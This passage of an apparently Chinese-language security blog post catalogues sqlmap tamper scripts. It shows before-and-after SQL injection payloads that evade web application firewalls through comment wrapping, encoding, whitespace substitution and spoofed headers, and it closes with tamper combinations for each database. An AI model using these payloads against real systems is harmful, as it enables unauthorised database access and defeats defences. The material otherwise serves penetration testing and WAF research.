+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1 to 34=&amp;Xe=&amp;90=&amp;Ni=&amp;rW=&amp;lc=&amp;te=&amp;T4=&amp;zO=&amp;NY=&amp;B4=&amp;hM=&amp;X2=&amp;pU=&amp;D8=&amp;hm=&amp;p0=&amp;7y=&amp;18=&amp;RK=&amp;Xi=&amp;5M=&amp;vM=&amp;hO=&amp;<span class="built_in">bg</span>=&amp;5c=&amp;b8=&amp;dE=&amp;7I=&amp;5I=&amp;90=&amp;R2=&amp;BK=&amp;bY=&amp;p4=&amp;lu=&amp;po=&amp;Vq=&amp;bY=&amp;3c=&amp;ps=&amp;Xu=&amp;lK=&amp;3Q=&amp;7s=&amp;pq=&amp;1E=&amp;rM=&amp;FG=&amp;vG=&amp;Xy=&amp;tQ=&amp;lm=&amp;rO=&amp;pO=&amp;rO=&amp;1M=&amp;vy=&amp;La=&amp;xW=&amp;f8=&amp;du=&amp;94=&amp;vE=&amp;9q=&amp;bE=&amp;lQ=&amp;JS=&amp;NQ=&amp;fE=&amp;RO=&amp;FI=&amp;zm=&amp;5A=&amp;lE=&amp;DK=&amp;x8=&amp;RQ=&amp;Xw=&amp;LY=&amp;5S=&amp;zi=&amp;Js=&amp;la=&amp;3I=&amp;r8=&amp;re=&amp;Xe=&amp;5A=&amp;3w=&amp;vs=&amp;zQ=&amp;1Q=&amp;HW=&amp;Bw=&amp;Xk=&amp;LU=&amp;Lk=&amp;1E=&amp;Nw=&amp;pm=&amp;ns=&amp;zO=&amp;xq=&amp;7k=&amp;v4=&amp;F6=&amp;Pi=&amp;vo=&amp;zY=&amp;vk=&amp;3w=&amp;tU=&amp;nW=&amp;TG=&amp;NM=&amp;9U=&amp;p4=&amp;9A=&amp;T8=&amp;Xu=&amp;xa=&amp;Jk=&amp;nq=&amp;La=&amp;lo=&amp;zW=&amp;xS=&amp;v0=&amp;Z4=&amp;vi=&amp;Pu=&amp;jK=&amp;DE=&amp;72=&amp;fU=&amp;DW=&amp;1g=&amp;RU=&amp;Hi=&amp;li=&amp;R8=&amp;dC=&amp;nI=&amp;9A=&amp;tq=&amp;1w=&amp;7u=&amp;rg=&amp;pa=&amp;7c=&amp;zk=&amp;rO=&amp;xy=&amp;ZA=&amp;1K=&amp;ha=&amp;tE=&amp;RC=&amp;3m=&amp;r2=&amp;Vc=&amp;B6=&amp;9A=&amp;Pk=&amp;Pi=&amp;zy=&amp;lI=&amp;pu=&amp;re=&amp;vS=&amp;zk=&amp;RE=&amp;xS=&amp;Fs=&amp;x8=&amp;Fe=&amp;rk=&amp;Fi=&amp;Tm=&amp;fA=&amp;Zu=&amp;DS=&amp;No=&amp;lm=&amp;lu=&amp;li=&amp;jC=&amp;Do=&amp;Tw=&amp;xo=&amp;zQ=&amp;nO=&amp;ng=&amp;nC=&amp;PS=&amp;fU=&amp;Lc=&amp;Za=&amp;Ta=&amp;1y=&amp;lw=&amp;pA=&amp;ZW=&amp;nw=&amp;pM=&amp;pa=&amp;Rk=&amp;lE=&amp;5c=&amp;T4=&amp;Vs=&amp;7W=&amp;Jm=&amp;xG=&amp;nC=&amp;Js=&amp;xM=&amp;Rg=&amp;zC=&amp;Dq=&amp;VA=&amp;Vy=&amp;9o=&amp;7o=&amp;Fk=&amp;Ta=&amp;Fq=&amp;9y=&amp;vq=&amp;rW=&amp;X4=&amp;1W=&amp;hI=&amp;nA=&amp;hs=&amp;He=&amp;No=&amp;vy=&amp;9C=&amp;ZU=&amp;t6=&amp;1U=&amp;1Q=&amp;Do=&amp;bk=&amp;7G=&amp;nA=&amp;VE=&amp;F0=&amp;BO=&amp;l2=&amp;BO=&amp;7o=&amp;zq=&amp;B4=&amp;fA=&amp;lI=&amp;Xy=&amp;Ji=&amp;lk=&amp;7M=&amp;JG=&amp;Be=&amp;ts=&amp;36=&amp;tW=&amp;fG=&amp;T4=&amp;vM=&amp;hG=&amp;tO=&amp;VO=&amp;9m=&amp;Rm=&amp;LA=&amp;5K=&amp;FY=&amp;HW=&amp;7Q=&amp;t0=&amp;3I=&amp;Du=&amp;Xc=&amp;BS=&amp;N0=&amp;x4=&amp;fq=&amp;jI=&amp;Ze=&amp;TQ=&amp;5i=&amp;T2=&amp;FQ=&amp;VI=&amp;Te=&amp;Hq=&amp;fw=&amp;LI=&amp;Xq=&amp;LC=&amp;B0=&amp;h6=&amp;TY=&amp;HG=&amp;Hw=&amp;dK=&amp;ru=&amp;3k=&amp;JQ=&amp;5g=&amp;9s=&amp;HQ=&amp;vY=&amp;1S=&amp;ta=&amp;bq=&amp;1u=&amp;9i=&amp;DM=&amp;DA=&amp;TG=&amp;vQ=&amp;Nu=&amp;RK=&amp;da=&amp;56=&amp;nm=&amp;vE=&amp;Fg=&amp;jY=&amp;t0=&amp;DG=&amp;9o=&amp;PE=&amp;da=&amp;D4=&amp;VE=&amp;po=&amp;nm=&amp;lW=&amp;X0=&amp;BY=&amp;NK=&amp;pY=&amp;5Q=&amp;jw=&amp;r0=&amp;FM=&amp;lU=&amp;da=&amp;ls=&amp;Lg=&amp;D8=&amp;B8=&amp;FW=&amp;3M=&amp;zy=&amp;ho=&amp;Dc=&amp;HW=&amp;7E=&amp;bM=&amp;Re=&amp;jk=&amp;Xe=&amp;JC=&amp;vs=&amp;Ny=&amp;D4=&amp;fA=&amp;DM=&amp;1o=&amp;9w=&amp;3C=&amp;Rw=&amp;Vc=&amp;Ro=&amp;PK=&amp;rw=&amp;Re=&amp;54=&amp;xK=&amp;VK=&amp;1O=&amp;1U=&amp;vg=&amp;Ls=&amp;xq=&amp;NA=&amp;zU=&amp;di=&amp;BS=&amp;pK=&amp;bW=&amp;Vq=&amp;BC=&amp;l6=&amp;34=&amp;PE=&amp;JG=&amp;TA=&amp;NU=&amp;hi=&amp;T0=&amp;Rs=&amp;fw=&amp;FQ=&amp;NQ=&amp;Dq=&amp;Dm=&amp;1w=&amp;PC=&amp;j2=&amp;r6=&amp;re=&amp;t2=&amp;Ry=&amp;h2=&amp;9m=&amp;nw=&amp;X4=&amp;vI=&amp;rY=&amp;1K=&amp;7m=&amp;7g=&amp;J8=&amp;Pm=&amp;RO=&amp;7A=&amp;fO=&amp;1w=&amp;1g=&amp;7U=&amp;7Y=&amp;hQ=&amp;FC=&amp;vu=&amp;Lw=&amp;5I=&amp;t0=&amp;Na=&amp;vk=&amp;Te=&amp;5S=&amp;ZM=&amp;Xs=&amp;Vg=&amp;tE=&amp;J2=&amp;Ts=&amp;Dm=&amp;Ry=&amp;FC=&amp;7i=&amp;h8=&amp;3y=&amp;zk=&amp;5G=&amp;NC=&amp;Pq=&amp;ds=&amp;zK=&amp;d8=&amp;zU=&amp;1a=&amp;d8=&amp;Js=&amp;nk=&amp;TQ=&amp;tC=&amp;n8=&amp;Hc=&amp;Ru=&amp;H0=&amp;Bo=&amp;XE=&amp;Jm=&amp;xK=&amp;r2=&amp;Fu=&amp;FO=&amp;NO=&amp;7g=&amp;PC=&amp;Bq=&amp;3O=&amp;FQ=&amp;1o=&amp;5G=&amp;zS=&amp;Ps=&amp;j0=&amp;b0=&amp;RM=&amp;DQ=&amp;RQ=&amp;zY=&amp;nk=&amp;1 AND 2&gt;1</span><br></pre></td></tr></table></figure>
+
+<p>适用：Lua nginx WAF</p>
+<h5 id="27-modsecurityversioned-py"><a href="#27-modsecurityversioned-py" class="headerlink" title="27.modsecurityversioned.py"></a>27.modsecurityversioned.py</h5><p>添加完整的查询版本的注释，用注释来包围完整的查询语句，用于绕过ModSecurity 开源WAF</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1-- to 1 /*!30963AND 2&gt;1*/--</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL 5.0</p>
+<h5 id="28-modsecurityzeroversioned-py"><a href="#28-modsecurityzeroversioned-py" class="headerlink" title="28.modsecurityzeroversioned.py"></a>28.modsecurityzeroversioned.py</h5><p>添加完整的查询版本的注释,用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1-- to 1 /*!00000AND 2&gt;1*/--</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL 5.0</p>
+<h5 id="29-multiplespaces-py"><a href="#29-multiplespaces-py" class="headerlink" title="29.multiplespaces.py"></a>29.multiplespaces.py</h5><p>在关键字周围添加多个空格</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT foobar to 1     UNION     SELECT     foobar</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="30-overlongutf8-py"><a href="#30-overlongutf8-py" class="headerlink" title="30.overlongutf8.py"></a>30.overlongutf8.py</h5><p>转换给定的payload当中的所有字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE WHERE 2&gt;1 to SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="31-overlongutf8more-py"><a href="#31-overlongutf8more-py" class="headerlink" title="31.overlongutf8more.py"></a>31.overlongutf8more.py</h5><p>指定的payload转换所有字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE WHERE 2&gt;1 to %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="32-percentage-py"><a href="#32-percentage-py" class="headerlink" title="32.percentage.py"></a>32.percentage.py</h5><p>每个字符前添加%，用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE to %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL，但是需要asp环境</p>
+<h5 id="33-plus2concat-py"><a href="#33-plus2concat-py" class="headerlink" title="33.plus2concat.py"></a>33.plus2concat.py</h5><p>将加号替换为concat函数,用于加号被过滤的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL </span><br><span class="line">SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：Microsoft SQL Server 2012+</p>
+<h5 id="34-plus2fnconcat"><a href="#34-plus2fnconcat" class="headerlink" title="34.plus2fnconcat"></a>34.plus2fnconcat</h5><p>将加号替换为ODBC函数{fn CONCAT()}，用于加号别过滤的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL </span><br><span class="line">SELECT &#123;fn CONCAT(&#123;fn CONCAT(CHAR(113),CHAR(114))&#125;,CHAR(115))&#125; FROM DUAL</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：Microsoft SQL Server 2008+</p>
+<h5 id="35-randomcase-py"><a href="#35-randomcase-py" class="headerlink" title="35.randomcase.py"></a>35.randomcase.py</h5><p>字符大小写随机替换,将payload随机大小写，可用于大小写绕过的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM `user` to SeLeCt id FrOm `user`</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="36-randomcomments-py"><a href="#36-randomcomments-py" class="headerlink" title="36.randomcomments.py"></a>36.randomcomments.py</h5><figure class="highlight plain"><figcaption><span>payload 的关键字中间随机插入```/**/``` ，可用于绕过关键字过滤</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```bash </span><br><span class="line">INSERT to I/**/NS/**/ERT</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL，但是需要asp环境</p>
+<h5 id="37-sp-password-py"><a href="#37-sp-password-py" class="headerlink" title="37.sp_password.py"></a>37.sp_password.py</h5><p>追加sp_password字符串,在payload语句后天机sp_password，用于迷惑数据库日志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227--  to 1 AND 9227=9227-- sp_password</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MsSSQL</p>
+<h5 id="38-space2comment-py"><a href="#38-space2comment-py" class="headerlink" title="38.space2comment.py"></a>38.space2comment.py</h5><p>空格替换为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```bash</span><br><span class="line">SELECT id FROM users to SELECT/**/id/**/FROM/**/users</span><br></pre></td></tr></table></figure></p>
+<p>适用数据库：ALL</p>
+<h5 id="39-space2dash-py"><a href="#39-space2dash-py" class="headerlink" title="39.space2dash.py"></a>39.space2dash.py</h5><p>用注释符–和一个随机字符串加一个换行符替换空格字符<br>Replaces space character (‘ ‘) with a dash comment (‘–’) followed by a random string and a new line (‘\n’)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 to 1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MSSQL、SQLite</p>
+<h5 id="40-space2hash-py"><a href="#40-space2hash-py" class="headerlink" title="40.space2hash.py"></a>40.space2hash.py</h5><p>空格替换为#加随机字符,用#和一个随机字符串加一个换行符替换空格字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 to 1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL 4.0, 5.0</p>
+<h5 id="41-space2morecomment-py"><a href="#41-space2morecomment-py" class="headerlink" title="41.space2morecomment.py"></a>41.space2morecomment.py</h5><p>空格替换为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```bash</span><br><span class="line">SELECT id FROM users to SELECT/**_**/id/**_**/FROM/**_**/users</span><br></pre></td></tr></table></figure></p>
+<p>适用数据库：MySQL 5.0 and 5.5</p>
+<h5 id="42-space2morehash-py"><a href="#42-space2morehash-py" class="headerlink" title="42.space2morehash.py"></a>42.space2morehash.py</h5><p>空格替换为#加随机字符及换行符,和 space2hash.py 类似，这里多一个 # 和换行符,具体如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 to 1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227</span><br><span class="line"></span><br><span class="line">1 AND 9227=9227 to 1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL &gt;= 5.1.13</p>
+<h5 id="43-space2mssqlblank-py"><a href="#43-space2mssqlblank-py" class="headerlink" title="43.space2mssqlblank.py"></a>43.space2mssqlblank.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blanks = (<span class="string">'%01'</span>, <span class="string">'%02'</span>, <span class="string">'%03'</span>, <span class="string">'%04'</span>, <span class="string">'%05'</span>, <span class="string">'%06'</span>, <span class="string">'%07'</span>, <span class="string">'%08'</span>, <span class="string">'%09'</span>, <span class="string">'%0B'</span>, <span class="string">'%0C'</span>, <span class="string">'%0D'</span>, <span class="string">'%0E'</span>, <span class="string">'%0F'</span>, <span class="string">'%0A'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>用一组有效的备选字符集当中的随机空白符替换空格符,以上这些随机空白符替换payload中的空格</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users to SELECT%0Did%0DFROM%04users</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：SQL Server</p>
+<h5 id="44-space2mssqlhash-py"><a href="#44-space2mssqlhash-py" class="headerlink" title="44.space2mssqlhash.py"></a>44.space2mssqlhash.py</h5><p>用 # 加一个换行符替换 payload 中的空格</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 to 1%23%0AAND%23%0A9227=9227</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MSSQL、MySQL</p>
+<h5 id="45-space2mysqlblank-py"><a href="#45-space2mysqlblank-py" class="headerlink" title="45.space2mysqlblank.py"></a>45.space2mysqlblank.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blanks = (<span class="string">'%09'</span>, <span class="string">'%0A'</span>, <span class="string">'%0C'</span>, <span class="string">'%0D'</span>, <span class="string">'%0B'</span>, <span class="string">'%A0'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>用一组有效的备选字符集当中的随机空白符替换空格符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users to SELECT%A0id%0CFROM%0Dusers</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL</p>
+<h5 id="46-space2mysqldash-py"><a href="#46-space2mysqldash-py" class="headerlink" title="46.space2mysqldash.py"></a>46.space2mysqldash.py</h5><p>用破折号注释符“–”其次是一个换行符替换空格符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 to 1--%0AAND--%0A9227=9227</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL、MSSQL</p>
+<h5 id="47-space2plu-py"><a href="#47-space2plu-py" class="headerlink" title="47.space2plu.py"></a>47.space2plu.py</h5><p>用加号“+”替换空格</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users to SELECT+id+FROM+users</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="48-space2randomblank-py"><a href="#48-space2randomblank-py" class="headerlink" title="48.space2randomblank.py"></a>48.space2randomblank.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blanks = (<span class="string">"%09"</span>, <span class="string">"%0A"</span>, <span class="string">"%0C"</span>, <span class="string">"%0D"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>用一组有效的备选字符集当中的随机空白符替换空格符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users to SELECT%0Did%0CFROM%0Ausers</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="49-substring2leftright-py"><a href="#49-substring2leftright-py" class="headerlink" title="49.substring2leftright.py"></a>49.substring2leftright.py</h5><p>PostgreSQL中将substring函数用left right函数代替</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1) to LEFT((SELECT usename FROM pg_user)::text,1)</span><br><span class="line">SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1) to LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：PostgreSQL</p>
+<h5 id="50-symboliclogical-py"><a href="#50-symboliclogical-py" class="headerlink" title="50.symboliclogical.py"></a>50.symboliclogical.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = re.sub(r<span class="string">"(?i)\bAND\b"</span>, <span class="string">"%26%26"</span>, re.sub(r<span class="string">"(?i)\bOR\b"</span>, <span class="string">"%7C%7C"</span>, payload))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>&& 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```bash</span><br><span class="line">1 AND &apos;1&apos;=&apos;1 to 1 %26%26 &apos;1&apos;=&apos;1</span><br><span class="line">1 or 1=1 to 1 %7c%7c 1=1</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="51-unionalltounion-py"><a href="#51-unionalltounion-py" class="headerlink" title="51.unionalltounion.py"></a>51.unionalltounion.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> payload.replace(<span class="string">"UNION ALL SELECT"</span>, <span class="string">"UNION SELECT"</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>用union all select替换为union select</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 UNION ALL SELECT to -1 UNION SELECT</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="52-unmagicquotes-py"><a href="#52-unmagicquotes-py" class="headerlink" title="52.unmagicquotes.py"></a>52.unmagicquotes.py</h5><p>用宽字符绕过GPC，一个多字节组合%bf%27和末尾通用注释一起替换空格符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' AND 1=1 to 1%bf%27-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="53-uppercase-py"><a href="#53-uppercase-py" class="headerlink" title="53.uppercase.py"></a>53.uppercase.py</h5><p>将payload全部替换为大写值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert to INSERT</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="54-varnish-py"><a href="#54-varnish-py" class="headerlink" title="54.varnish.py"></a>54.varnish.py</h5><p>添加一个HTTP头“X-originating-IP”来绕过WAF<br>且可以自定义：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)</span><br><span class="line">X-remote-IP: TARGET_PROXY_IP (184.189.250.X)</span><br><span class="line">X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)</span><br><span class="line">x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)</span><br><span class="line">X-remote-IP: * or %00 or %0A</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="55-versionedkeywords-py"><a href="#55-versionedkeywords-py" class="headerlink" title="55.versionedkeywords.py"></a>55.versionedkeywords.py</h5><p>用MySQL注释包围每个非函数的关键字</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">to</span><br><span class="line"></span><br><span class="line">1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL</p>
+<h5 id="56-versionedmorekeywords-py"><a href="#56-versionedmorekeywords-py" class="headerlink" title="56.versionedmorekeywords.py"></a>56.versionedmorekeywords.py</h5><p>用MySQL注释包围每个关键字，使用注释绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">to</span><br><span class="line"></span><br><span class="line">1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="57-xforwardedfor-py"><a href="#57-xforwardedfor-py" class="headerlink" title="57.xforwardedfor.py"></a>57.xforwardedfor.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">headers = kwargs.get(<span class="string">"headers"</span>, &#123;&#125;)</span><br><span class="line">headers[<span class="string">"X-Forwarded-For"</span>] = randomIP()</span><br><span class="line">headers[<span class="string">"X-Client-Ip"</span>] = randomIP()</span><br><span class="line">headers[<span class="string">"X-Real-Ip"</span>] = randomIP()</span><br></pre></td></tr></table></figure>
+
+<p>添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</p>
+<p>适用数据库：ALL</p>
+<h4 id="一些常用的tamper组合"><a href="#一些常用的tamper组合" class="headerlink" title="一些常用的tamper组合"></a>一些常用的tamper组合</h4><h5 id="通用的测试tamper"><a href="#通用的测试tamper" class="headerlink" title="通用的测试tamper"></a>通用的测试tamper</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure>
+
+<h5 id="Microsoft-SQL-Server"><a href="#Microsoft-SQL-Server" class="headerlink" title="Microsoft SQL Server"></a>Microsoft SQL Server</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure>
+
+<h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor</span><br></pre></td></tr></table></figure>
+
+<h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor</span><br></pre></td></tr></table></figure>
+
